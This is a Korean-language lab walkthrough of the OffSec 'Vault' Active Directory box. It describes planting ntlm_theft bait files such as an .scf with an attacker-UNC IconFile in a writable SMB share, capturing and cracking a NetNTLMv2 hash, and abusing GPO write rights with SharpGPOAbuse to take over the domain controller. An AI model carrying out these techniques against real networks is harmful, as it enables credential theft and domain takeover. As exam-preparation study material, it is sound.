---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/svc/smb
  - tech/ad/ntlm-relay
  - tech/cred/crack
  - tech/ad/bloodhound
  - tech/ad/gpo-abuse
  - tech/exec/winrm
  - tech/win/serestore
  - tech/win/sebackup
  - tech/ad/dcsync
  - tech/ad/pth
type: machine
platform: pg
os: windows
ip: 192.168.120.172
domain: vault.offsec
ports: [53, 88, 123, 135, 139, 389, 445, 464, 593, 636, 3268, 3389, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, ms-wbt-server, msrpc, ncacn_http, netbios-ssn, ntp]
status: solved
manual_tags: true
manual_cves: true
tech_count: 10
---
> [!info] PG Practice — **Advanced** · 단일 DC Active Directory 박스
> **타겟** 192.168.120.172 · **OS** Windows Server 2019 Standard (build 17763, `DC.vault.offsec`) · **난이도** Advanced · **플래그 2개**
> **경로 요약** 익명 쓰기 가능한 `DocumentsShare`에 `ntlm_theft` 미끼 파일 투하 → 디렉터리를 연 `VAULT\anirudh`의 NetNTLMv2 캡처 → hashcat `-m 5600` 크랙(`SecureHM`) → WinRM 셸 → BloodHound에서 **`anirudh → GenericWrite on Default Domain Policy(GPO)`** 확인 → SharpGPOAbuse로 자신을 로컬 관리자에 추가 → `gpupdate` → Administrator

> [!warning] 이 노트를 읽는 규약 — 실측과 재구성을 구분하라
> - **실측** — Kali 산출물 `~/PG/Vault/`(`nmap.log` · `udp.txt` · `hash.txt` · `test.txt` · BloodHound JSON 7종), `~/.zsh_history`, hashcat potfile, 원본 노트의 스크린샷.
> - **BloodHound JSON은 `jq`로 직접 열어 대조**했다 — 이 노트의 ACL 서술은 그래프 스크린샷이 아니라 원본 JSON이 1차 근거다.
> - **미실행** — §4-6·§4-7의 SeBackup·diskshadow 경로는 이 박스에서 끝까지 실행하지 않았다. 원본 노트에 "다른 방법"으로 적혀 있던 절차이며, 코드펜스 밖 산문 또는 `[가정]` 표시로 구분해 남긴다.

## 0. 이 박스에서 배우는 것

- **쓰기 가능한 SMB 공유는 파일 저장소가 아니라 자격증명 덫이다** — 미끼 파일 한 벌을 넣으면 그 폴더를 여는 사용자가 자동으로 내 리스너에 인증한다. [[Heist]]의 웹 `?url=`과 정확히 같은 결과를 다른 트리거로 얻는다
- **`ntlm_theft`의 24가지 미끼 파일이 각각 무엇을 트리거하는가** — `.scf`·`desktop.ini`·`.url`은 폴더를 여는 것만으로, `.lnk`·`.docx`는 열어야, `.library-ms`는 미리보기로
- **GPO 쓰기 권한 = 도메인 장악** — `GenericWrite`가 걸린 GPO 하나로 그 GPO가 적용되는 모든 머신에 로컬 관리자를 심는다. DC에 링크된 정책이면 DC의 관리자가 된다
- **`gpupdate /force`의 의미** — 공격이 GPO를 고쳐도 정책 새로고침 주기(기본 90분) 를 기다려야 반영된다. 강제로 당길 수 있는 조건과 방법
- **한 계정으로 가는 SYSTEM 경로가 셋** — GPO ACL(실제 사용) · `SeRestorePrivilege`(utilman) · `SeBackupPrivilege`(ntds.dit 덤프). `whoami /priv`가 갈림길

**시험 출제 가능성**

| 요소 | 출제 가능성 | 이유 |
|---|---|---|
| 쓰기 공유 → 미끼 → NetNTLMv2 캡처 → 크랙 | 매우 높음 | [[Heist]](웹)와 짝을 이루는 강제 인증의 두 번째 얼굴. 익명/게스트 쓰기 공유는 시험 단골이다 |
| GPO 악용 (SharpGPOAbuse) | 중간 | `GenericWrite`/`WriteDACL`이 GPO에 걸린 것을 BloodHound가 잡으면 정석 경로. 이름만 알면 5분 |
| `SeBackupPrivilege` → ntds.dit → DCSync | 매우 높음 | Windows 셸 잡고 `whoami /priv`가 첫 명령. Backup Operators는 시험 단골 |
| BloodHound 최단경로 읽기 | 매우 높음 | 열거 도구라 시험에서 허용. 그래프 없이는 이 박스의 GPO 경로를 못 찾는다 |

변형 — `DocumentsShare` 대신 `\\dc\profiles$`·`\\dc\scripts`, GPO 대신 사용자 객체 `GenericAll`, `SeBackup` 대신 `SeRestore`([[Heist]]). **원리는 동일하다.**

**OSCP 시험 규정 — 이 박스 도구는 전부 허용**
BloodHound·nxc·Responder·hashcat·evil-winrm·SharpGPOAbuse·impacket-secretsdump 모두 **열거 또는 수동 후속 도구**라 허용된다. `ntlm_theft`는 미끼 파일 생성기일 뿐 자동 익스플로잇이 아니다. 금지는 `sqlmap` 계열과 Nessus/OpenVAS 계열. Metasploit은 1대 한정이며 이 박스는 쓰지 않는다.

---

## 1. 정찰

### 1-1. Nmap — [[Heist]]와 판박이인 DC 지문

`nnmap`은 별칭이다 (`~/.zshrc:247`: `nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log`).

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ nnmap 192.168.120.172
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-08 09:15 +0900
Nmap scan report for 192.168.120.172
Host is up (0.085s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-08 00:15:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2026-07-07T00:13:45
|_Not valid after:  2027-01-06T00:13:45
|_ssl-date: 2026-07-08T00:17:35+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-08T00:16:55+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
...
Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-08T00:16:56
|_  start_date: N/A
Nmap done: 1 IP address (1 host up) scanned in 131.55 seconds
```

**[[Heist]]와의 유일한 차이는 8080이 없다는 것이다.** 웹 진입점이 없다 → SMB부터 판다. DC 포트 지문·SMB 서명 필수·`ssl-date 0s`는 전부 동일하다(그 해설은 [[Heist]] §1-1 참조).

**웹이 없는 AD 박스 = SMB·LDAP·Kerberos가 진입로다**
80/443/8080이 안 보이면 남는 공격면은 셋이다:
1. **SMB(445)** — 익명/게스트 공유, null 세션 사용자 열거 ← 이 박스
2. **LDAP(389)** — 익명 바인드로 사용자·설명(description) 필드에서 비밀번호 줍기
3. **Kerberos(88)** — 사용자명만 알면 AS-REP 로스팅(`GetNPUsers -no-pass`)

이 박스는 1번으로 풀렸다. 나머지 둘도 실제로 시도했다(§6).

### 1-2. UDP — NTP가 열려 있다는 사실의 의미

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ sudo nmap -sU --top-ports 100 192.168.120.172 -oN udp.txt
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
```

`123/udp ntp` — **DC는 도메인의 시간 서버다.** 이것이 켜져 있다는 것은 Kerberos 시계 동기의 기준점이 여기라는 뜻이다. 크로스체크에 쓴다:

```bash
sudo ntpdate -q 192.168.120.172   # 타겟 시각을 질의만 (수정 안 함)
```

이 박스는 `ssl-date`가 `0s from scanner time`이라 시계 문제가 없었다(그래서 위 질의는 필수가 아니었다). **`KRB_AP_ERR_SKEW`를 만나면** 이 NTP로 Kali를 맞춘다 — 대처 상세는 [[Heist]] §2-8.

### 1-3. SMB 공유 열거 — 여기가 전부다

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ smbclient -L 192.168.120.172 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DocumentsShare  Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.120.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

![[Pasted image 20260708103721.png]]

**`-N`은 "no password"(null 세션)** 이다 — 익명으로 공유 목록이 나왔다. 표준 공유(`ADMIN$`·`C$`·`IPC$`·`NETLOGON`·`SYSVOL`) 사이에 **`DocumentsShare`라는 비표준 공유**가 하나 있다. 이것이 이 박스가 심어둔 진입점이다.

**하단 SMB1 오류는 무시해도 된다**
`Unable to connect with SMB1`은 정상이다. smbclient가 워크그룹 목록을 얻으려고 레거시 SMB1로 재시도하는데, 현대 Windows는 SMB1을 꺼놨다. **공유 목록은 이미 위에서 SMB2/3로 받았다.** 이 오류를 보고 "SMB가 막혔다"고 오판하지 마라.

### 1-4. `DocumentsShare` 접근 + 쓰기 가능 확인

권한을 두 도구로 교차 확인했다. 먼저 실제로 파일을 올려본다:

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ smbclient //192.168.120.172/DocumentsShare -U ''
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov 19 17:59:02 2021
  ..                                  D        0  Fri Nov 19 17:59:02 2021

                7706623 blocks of size 4096. 712639 blocks available
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kB/s) (average 0.0 kB/s)
smb: \> ls
  .                                   D        0  Wed Jul  8 10:38:11 2026
  ..                                  D        0  Wed Jul  8 10:38:11 2026
  test.txt                            A        5  Wed Jul  8 10:38:11 2026
```

![[Pasted image 20260708103849.png]]

**`put test.txt`가 성공했다 — 쓰기 가능하다.** `test.txt`(5바이트, `~/PG/Vault/test.txt`에 `test`)가 실제 검증 파일이다. 그리고 폴더 안이 비어 있다는 점이 중요하다 — 읽을 것이 없다. 이 공유의 용도는 "내가 읽는 것"이 아니라 "**내가 쓴 것을 누군가 읽게** 만드는 것"이다.

`smbmap`으로 권한을 명시적으로 재확인:

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ smbmap -H 192.168.120.172 -u anonymous
[+] IP: 192.168.120.172:445     Name: 192.168.120.172           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DocumentsShare                                          READ, WRITE
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        SYSVOL                                                  NO ACCESS       Logon server share
```

**`DocumentsShare  READ, WRITE`.** 이 한 줄이 전체 공격을 여는 열쇠다.

**익명 인증의 세 가지 표기 — 전부 시도하라**
smbclient/smbmap/nxc가 익명을 표현하는 방식이 제각각이다. 하나가 막히면 다음 것:
- `smbclient //IP/share -N` (null 세션) · `-U ''` (빈 사용자) · `-U 'guest'` · `-U 'anonymous'`
- `smbmap -H IP -u anonymous` · `-u '' -p ''` · `-u guest`
- `nxc smb IP -u '' -p '' --shares` · `-u guest -p ''`

`~/.zsh_history`를 보면 이 박스에서 이 전부를 순서대로 쳤다(§6-1). 서버마다 익명을 받는 계정 이름이 다르기 때문이다.

---

## 2. 취약점 분석

### 2-0. 배경 — SMB 익명 접근과 null 세션의 보안 모델

이 박스의 진입점은 "익명으로 쓸 수 있는 공유"다. 왜 그것이 가능하고, 무엇을 의미하는지를 먼저 정리한다 — 이 개념이 없으면 §1-3의 `-N`이 왜 통했는지, 왜 여러 익명 표기를 다 시도해야 하는지(§6-1)를 이해할 수 없다.

Windows SMB에서 "익명"은 실제로는 **세 가지 다른 것**이고, 서버마다 어느 것을 받는지가 다르다:

| 표기 | 실제 인증 | 서버가 보는 것 |
|---|---|---|
| **null 세션** (`-N`) | 사용자명·비밀번호 둘 다 빈 문자열 | `ANONYMOUS LOGON` (S-1-5-7) |
| **빈 사용자** (`-U ''`) | 사용자명 빈 문자열 | 대개 null 세션과 같게 처리 |
| **Guest** (`-U 'guest'`) | `Guest` 계정 (활성화돼 있으면) | `VAULT\Guest` |
| **anonymous** (`-U 'anonymous'`) | 문자 그대로 `anonymous`라는 사용자 | 그런 계정이 없으면 실패, Guest로 매핑되기도 |

**어느 것이 통하는지는 서버 설정에 달렸다.** 그래서 하나만 시도하고 "익명 불가"로 판단하면 진입점을 놓친다 — 이 박스는 `-N`과 `-U ''`가 통했고 `guest`·`anonymous`는 §6-1에서 전부 시도한 흔적이 있다.

**null 세션이 역사적으로 위험한 이유**
구형 Windows(2000/2003)는 null 세션에 사용자 목록·그룹·비밀번호 정책·공유까지 열람을 허용했다(`RestrictAnonymous=0`). `enum4linux`가 캐던 것이 정확히 이것이다. 현대 Windows는 대부분 막았지만, 공유별 ACL이 `Everyone`/`ANONYMOUS LOGON`에 열려 있으면 이 박스처럼 익명 읽기·쓰기가 그대로 성립한다.

**판정 포인트: `smbmap`이 공유별 권한을 직접 찍어준다**(§1-4의 `READ, WRITE`). 이 한 줄이 "익명이 무엇을 할 수 있는가"의 확정 답이다.

공유가 비어 있다는 것도 신호다. `DocumentsShare`는 열었을 때 파일이 하나도 없었다(§1-4, 폴더 날짜만 2021년). 읽을 데이터가 없는 쓰기 공유는 **"여기에 뭔가 넣어라"** 라는 설계 의도를 드러낸다. 정상 문서 공유라면 문서가 있어야 한다. **비어 있고 + 쓰기 가능 = 미끼용으로 만들어진 공유**로 읽는다.

**이 공유가 만들어진 목적을 거꾸로 추론하는 훈련**
랩 제작자가 이 공유를 왜 뒀을까? 익명 쓰기 + 빈 폴더 + "폴더를 여는 사용자 시뮬레이션"의 조합은 강제 인증 실습을 유도하는 정형화된 패턴이다. 실전에서도 "부서 공유", "스캔 폴더", "임시 업로드" 같은 이름의 익명 쓰기 공유는 같은 방식으로 악용된다. 공유 이름과 내용(비어 있음)에서 "이걸로 무엇을 하라는 것인가" 를 읽는 습관을 들여라.

> [!danger] 익명 **쓰기**가 익명 **읽기**보다 훨씬 위험하다
> 익명 읽기는 정보 노출이지만, **익명 쓰기는 강제 인증 덫을 심을 수 있다**(§2-1). 이 박스가 정확히 그 사례다. `smbmap`/`nxc --shares` 출력에서 `WRITE`가 보이면 **그 자리에서 미끼 공격을 계획**하라 — 다른 취약점을 찾을 필요 없이 그것이 진입로일 확률이 높다.

### 2-1. 쓰기 공유가 왜 자격증명을 뱉는가

[[Heist]] §2-1의 강제 인증 원리가 여기서도 그대로 성립한다. 다른 것은 트리거다.

Windows 탐색기(또는 인덱싱 서비스·백신·미리보기 핸들러)가 폴더를 열면, 그 폴더 안의 특정 파일들이 원격 리소스를 자동으로 가져오려 시도한다. 그 원격 리소스를 **내 Kali의 UNC 경로**로 지정해 두면, 가져오는 과정에서 SMB 인증이 나가고 그것이 NetNTLMv2다.

핵심은 **사용자가 파일을 "실행"하거나 "열" 필요조차 없다는 것**이다. 어떤 미끼는 폴더를 여는 것만으로 발동한다. 그래서 이 공격은 "누군가 이 폴더를 열기만 하면" 성립한다 — 그리고 이 박스에는 그 폴더를 주기적으로 여는 무언가(사용자 시뮬레이션 또는 서비스)가 있었다.

### 2-2. `ntlm_theft`의 미끼 파일 — 무엇이 언제 발동하는가

`ntlm_theft.py -g all`은 24종의 미끼를 한 번에 만든다. 발동 조건이 제각각이라, 어느 것이 통할지 모르므로 전부 뿌린다. 발동 난이도 순으로 정리하면:

| 발동 조건 | 미끼 파일 | 메커니즘 |
|---|---|---|
| **폴더를 여는 것만으로** (가장 강력) | `desktop.ini` · `steal.scf` · `steal-(icon).url` · `Autorun.inf` | 탐색기가 폴더 렌더 시 아이콘/설정을 UNC에서 가져온다 |
| **미리보기 창에 뜨는 것만으로** | `steal.library-ms` · `steal-(externalcell).xlsx` | 미리보기 핸들러가 원격 참조를 해석 |
| **파일을 클릭/열면** | `steal.lnk` · `steal.url` · `steal-(url).url` | 바로가기 대상/아이콘이 UNC |
| **문서를 열면** | `steal-(includepicture).docx` · `steal-(remotetemplate).docx` · `steal-(frameset).docx` · `steal.rtf` · `steal-(stylesheet).xml` | Office가 원격 이미지/템플릿/스타일시트를 페치 |
| **미디어/앱을 열면** | `steal.m3u` · `steal.asx` · `steal.wax` · `steal.jnlp` · `steal.application` · `steal.pdf` · `steal.theme` | 각 핸들러가 원격 리소스 참조 |

**`.scf`와 `desktop.ini`가 "폴더 열기만으로" 발동하는 이유**
- **`.scf`(Shell Command File)** — `IconFile=\\<KALI>\share\icon.ico` 필드를 담는다. 탐색기가 폴더의 파일 아이콘을 그리려고 그 경로를 자동으로 확인한다. 파일을 클릭하지 않아도 아이콘 렌더 시점에 발동
- **`desktop.ini`** — 폴더 자체의 아이콘/툴팁을 정의하는 시스템 파일. 탐색기가 폴더에 진입하면 무조건 읽는다

그래서 이 둘이 "가장 강력한" 미끼다. **최신 Windows는 `.scf` 자동 아이콘 로딩을 상당수 막았지만**, `desktop.ini`·`.library-ms`·Office 계열은 여전히 넓게 통한다. 그러니 `-g all`로 다 뿌린다.

### 2-3. 왜 릴레이가 아니라 크랙인가 — [[Heist]]와 동일한 판정

`nmap.log`가 **`Message signing enabled and required`** 를 찍었고, 이 랩은 **DC 한 대짜리 단일 호스트**다(`computers.json`에 `DC.VAULT.OFFSEC` 하나). 릴레이할 두 번째 서버가 없다 → 크랙만 남는다. 판정 근거의 상세는 [[Heist]] §2-4와 동일하다.

### 2-4. 캡처 blob이 트리거를 증언한다 — `cifs/`

`~/PG/Vault/hash.txt`를 직접 디코드했다:

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ python3 - <<'EOF'
import binascii,struct
p=open('hash.txt').read().strip().split(':')
print('user=',p[0],'domain=',p[2])
b=binascii.unhexlify(p[5]); i=28
while i+4<=len(b):
    aid,alen=struct.unpack('<HH',b[i:i+4]); i+=4
    v=b[i:i+alen]; i+=alen
    if aid==0: break
    if aid==9: print('MsvAvTargetName =',v.decode('utf-16le'))
EOF
user= anirudh domain= VAULT
MsvAvTargetName = cifs/192.168.45.175
```

**`cifs/192.168.45.175`** — 인증이 SMB(CIFS)로 왔다. [[Heist]]는 같은 자리가 `HTTP/...`였다. **한 필드로 진입 벡터가 갈린다** — 이 박스는 파일 공유가 트리거였음이 blob 자체로 증명된다.

blob의 다른 AV_PAIR도 읽어보면 Responder의 정체가 드러난다 — `NbComputerName = WIN-XX6CZIRM2X8`, `DnsDomainName = ...T3QX.LOCAL`. 이것은 타겟의 이름이 아니라 Responder가 무작위로 만든 가짜 서버 신원이다(`~/PG/Vault/hash.txt`에서 디코드한 실측). Responder는 자신을 임의 이름의 SMB 서버로 위장해 클라이언트가 인증하게 유도한다 — 그래서 blob 안의 컴퓨터/도메인 이름은 **공격자 쪽 값**이고, 실제 인증한 사용자·도메인(`anirudh`/`VAULT`)만 콜론 앞 필드에서 진짜다.

> [!note] blob의 도메인 이름(`T3QX.LOCAL`)을 타겟 도메인으로 착각하지 마라
> hashcat에 넣을 때 도메인은 **콜론으로 구분된 3번째 필드(`VAULT`)** 다. blob 내부의 `DnsDomainName`은 Responder의 위장 값이라 HMAC 계산에 관여하지 않는 부분이다(AV_PAIR는 blob 전체로서 입력에 들어가지만, 크랙 시 우리가 지정하는 "도메인"은 3번째 필드다). 해시를 편집하지 말고 통째로 넣으면 이 구분을 신경 쓸 필요가 없다 — hashcat이 알아서 파싱한다.

**이 blob을 필드 단위로 해부하면** (이 노트만 읽어도 되게 자체 수록한다):

| 필드 | 이 박스의 값 | 정체 |
|---|---|---|
| `anirudh` | 사용자명 | 크랙 후 그대로 쓸 계정 |
| (빈칸) | LM 필드 | NTLMv2에서는 항상 비어 있다 |
| `VAULT` | 도메인(NetBIOS) | **HMAC 입력** — 형태가 바뀌면 크랙 실패 |
| `66134a3a082ecb7b` | **서버 챌린지** | Responder가 만든 8바이트 (`Challenge = Random`) |
| `751AA393...7C6AB5` | **NTProofStr** | HMAC-MD5(NTLMv2Hash, 챌린지‖blob). 크랙이 맞춰야 할 값 |
| `010100...` | **blob** | 타임스탬프 + 클라이언트 챌린지 + AV_PAIR 목록 |

크랙 알고리즘 — 후보 비밀번호 `p`에 대해:
`NTHash = MD4(UTF16LE(p))` → `NTLMv2Hash = HMAC-MD5(NTHash, UTF16LE("ANIRUDH"+"VAULT"))` → `HMAC-MD5(NTLMv2Hash, 챌린지‖blob)` 가 `NTProofStr`과 같으면 정답.

> [!warning] 해시를 한 글자도 편집하지 마라
> 사용자명·도메인·blob이 전부 HMAC 입력이다. Responder 출력의 `[SMB] NTLMv2-SSP Hash :` 뒤 **한 줄 전체**를 그대로 파일에 넣어라. 도메인을 FQDN(`vault.offsec`)으로 바꿔 적거나 줄바꿈이 끼면 **정답 비밀번호를 넣어도 실패**한다.

**hashcat 모드**는 Kali에서 직접 확인했다:

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -hh | grep -E "^\s+(5600|13100|18200)\s"
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
```

Responder/강제 인증 결과는 **`-m 5600`**. (AS-REP은 `-m 18200`, Kerberoast TGS-REP은 `-m 13100` — 이 셋의 프로토콜 수준 차이는 [[Heist]] §2-3.)

**NetNTLMv2가 왜 CPU만으로 순식간에 깨지는가**
이 해시는 **반복(iteration)이 없는 HMAC-MD5 2회**다. bcrypt·PBKDF2 같은 stretching이 없다. 그래서 CPU 단독으로도 초당 100만 건 이상 나오고, **rockyou 전체가 12초**다. `SecureHM`은 rockyou 안에 있어 즉시 깨졌다.
**판정: `-m 5600`이 12초 안에 안 깨지면 rockyou로는 안 된다.** 규칙(`-r best64.rule`)을 붙이거나 다른 경로로 간다. 여기서 오래 붙잡는 것이 시험 시간 낭비 1위다.

### 2-5. GPO 쓰기 권한이 왜 도메인 장악인가

BloodHound JSON에서 `anirudh`가 가진 아웃바운드 권한을 직접 뽑았다. 사용자·그룹 객체에는 비표준 ACE가 없었고, GPO 객체에서 나왔다:

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ jq -r '.data[] | .Properties.name as $n | (.Aces//[])[]
           | select(.PrincipalSID=="S-1-5-21-537427935-490066102-1511301751-1103")
           | [$n,.RightName] | @tsv' 20260708124927_gpos.json
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	GenericWrite
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	WriteOwner
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	WriteDacl
```

`-1103`이 anirudh다(`jq`로 확인). **anirudh는 `Default Domain Policy` GPO에 `GenericWrite`·`WriteOwner`·`WriteDacl`을 가진다.** BloodHound 그래프도 같은 세 엣지를 보여준다:

![[Pasted image 20260708131411.png]]

**GPO `GenericWrite` = 그 GPO가 적용되는 모든 컴퓨터에서 SYSTEM**
GPO는 정책의 껍데기이고 실제 설정은 SYSVOL의 파일(`GptTmpl.inf`·`ScheduledTasks.xml` 등)에 들어 있다. `GenericWrite`가 있으면 그 파일을 고칠 수 있고, 고칠 수 있는 것 중에:
- **제한된 그룹(Restricted Groups)** — "이 컴퓨터의 로컬 Administrators에 X를 넣어라" ← **SharpGPOAbuse `--AddLocalAdmin`이 이것**
- **즉시 예약 작업(Immediate Scheduled Task)** — "SYSTEM으로 이 명령을 실행하라" ← `--AddComputerTask`
- **로그온/시작 스크립트**

**`Default Domain Policy`는 도메인 루트에 링크돼 도메인의 모든 머신에 적용된다.** DC를 포함한다. 그래서 이 GPO에 로컬 관리자를 심으면 **DC의 로컬 Administrators 멤버**가 되고, DC에서 로컬 관리자는 곧 도메인 장악이다.

> [!note] 두 GPO 모두 anirudh가 아니라 Domain/Enterprise Admins만 통제한다 — 왜 anirudh 엣지가 특별한가
> BloodHound JSON의 GPO 두 개 전체의 ACE를 뽑으면 이렇다:
> ```bash
> ┌──(kali㉿kali)-[~/PG/Vault]
> └─$ jq -r '.data[] | .Properties.name as $n | (.Aces//[])[]
>            | select(.RightName|test("Write")) | [$n,.RightName,.PrincipalType] | @tsv' 20260708124927_gpos.json
> DEFAULT DOMAIN CONTROLLERS POLICY  GenericWrite  Group   # -512 Domain Admins
> DEFAULT DOMAIN CONTROLLERS POLICY  WriteOwner    Group   # -512
> ...
> DEFAULT DOMAIN POLICY  GenericWrite  Group   # -512 Domain Admins
> DEFAULT DOMAIN POLICY  WriteOwner    Group   # -519 Enterprise Admins
> DEFAULT DOMAIN POLICY  GenericWrite  User    # -1103 anirudh  ← 이것만 비정상
> DEFAULT DOMAIN POLICY  WriteOwner    User    # -1103
> DEFAULT DOMAIN POLICY  WriteDacl     User    # -1103
> ```
> **`Default Domain Controllers Policy`에는 anirudh 엣지가 없다.** 오직 `Default Domain Policy`에만, 오직 anirudh(User)에게 세 권한이 걸려 있다. 나머지는 전부 `Domain Admins`(-512)·`Enterprise Admins`(-519)라는 정상적인 기본 권한이다.
> **즉 이 박스의 취약점은 "일반 사용자 한 명에게 도메인 정책 GPO 쓰기 권한을 잘못 위임한 것" 딱 하나다.** 그 오설정을 BloodHound가 `Domain Admins`의 기본 권한 더미 속에서 골라내 준다 — 손으로 `nTSecurityDescriptor`를 파싱하는 것보다 훨씬 빠른 이유다.

**`WriteOwner`/`WriteDacl`도 같은 결과로 이어진다 — 2단계일 뿐**
만약 `GenericWrite`가 없고 `WriteDacl`만 있었다면: 먼저 `WriteDacl`로 **자신에게 `GenericWrite`(또는 FullControl)를 부여**한 다음 같은 공격을 한다. `WriteOwner`면 **소유권을 자신으로 바꾼 뒤** DACL을 고친다.
이 박스는 `GenericWrite`가 이미 있어 한 단계로 끝났다. 세 권한이 모두 걸려 있다는 것은 이 계정이 GPO에 대해 사실상 완전 통제권을 가졌다는 뜻이다.

### 2-6. `anirudh`는 왜 WinRM으로 바로 들어갔나

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ jq -r '.data[] | select((.Members//[])[].ObjectIdentifier=="S-1-5-21-537427935-490066102-1511301751-1103")
           | .Properties.name' 20260708124927_groups.json
SERVER OPERATORS@VAULT.OFFSEC
REMOTE MANAGEMENT USERS@VAULT.OFFSEC
```

두 가지가 나온다:

1. **Remote Management Users** — 그래서 `evil-winrm`이 붙는다(WinRM 접근권)
2. **Server Operators** — 이것이 §4-5·§4-6의 특권들(`SeBackupPrivilege`·`SeRestorePrivilege` 등)의 출처다

**`Server Operators`는 그 자체로 강력한 그룹이다**
이 내장 그룹의 멤버는 DC에서 서비스 시작/정지, 로컬 로그온, 백업/복원을 할 수 있다. `whoami /priv`(§4-5)에 뜬 `SeBackupPrivilege`·`SeRestorePrivilege`·`SeShutdownPrivilege`가 전부 이 멤버십에서 온다.
[[Heist]]의 `svc_apache$`는 URA로 특권을 직접 받았지만(그래프에 안 보임), 이 박스의 anirudh는 그룹 멤버십으로 받았다(그래프에 보임). 같은 특권, 다른 부여 경로. 그래서 이 박스는 특권 경로도 BloodHound로 예측 가능하다.

**`Server Operators`는 BloodHound가 기본으로 "High Value"로 칠하지 않을 수 있다**
`Domain Admins`·`Enterprise Admins`는 빨갛게 강조되지만, `Server Operators`·`Backup Operators`·`Print Operators` 같은 **내장 위임 그룹**은 놓치기 쉽다. 이들은 DC에서 관리자급 특권(`SeBackup`/`SeRestore`/서비스 제어)을 갖는데도 눈에 덜 띈다.
**판정: 사람 계정이 이 세 그룹 중 하나에 있으면 그 자체로 DC 장악 경로다.** anirudh가 정확히 그랬다. 그룹 이름만 보고 "운영 보조 계정이겠지"라고 넘기면 §4-6·§4-7의 특권을 통째로 놓친다.

### 2-7. SharpGPOAbuse가 SYSVOL에 실제로 무엇을 쓰는가

`GenericWrite`가 "GPO를 고칠 수 있다"는 것까지는 §2-5에서 봤다. 정확히 어떤 파일에 무엇이 쓰이는지를 알아야 손으로도 할 수 있고(시험 대비), 방어·탐지도 이해된다.

GPO는 두 곳에 나뉘어 저장된다:

| 저장소 | 위치 | 담는 것 |
|---|---|---|
| **GPC** (Group Policy Container) | LDAP: `CN={GUID},CN=Policies,CN=System,DC=vault,DC=offsec` | 메타데이터 — `versionNumber`, 확장 목록(`gPCMachineExtensionNames`) |
| **GPT** (Group Policy Template) | SYSVOL: `\\vault.offsec\SysVol\vault.offsec\Policies\{GUID}\` | 실제 설정 파일들 — `GPT.ini`, `Machine\...\GptTmpl.inf` 등 |

`--AddLocalAdmin`이 하는 일은 "제한된 그룹(Restricted Groups)" 설정을 `GptTmpl.inf`에 써넣는 것이다. §4-3 출력의 `File exists: ...\SecEdit\GptTmpl.inf`가 그 파일이다. 써지는 내용은 개념적으로 이렇다(관측한 파일 내용이 아니라 Restricted Groups의 표준 형식이다):

```ini
[Group Membership]
*S-1-5-32-544__Members = *S-1-5-21-537427935-490066102-1511301751-1103
```

`S-1-5-32-544`가 **로컬 Administrators의 잘 알려진 SID**이고, `__Members` 항목에 anirudh의 SID를 넣는다. 여기서 이름이 아니라 SID로 기록되는 것이 §4-3 출력에서 `SID Value of anirudh`를 먼저 계산한 이유다.

그리고 **두 버전 번호를 반드시 함께 올린다**:

| 위치 | SharpGPOAbuse 출력 |
|---|---|
| GPC의 `versionNumber` (LDAP) | `versionNumber attribute changed successfully` |
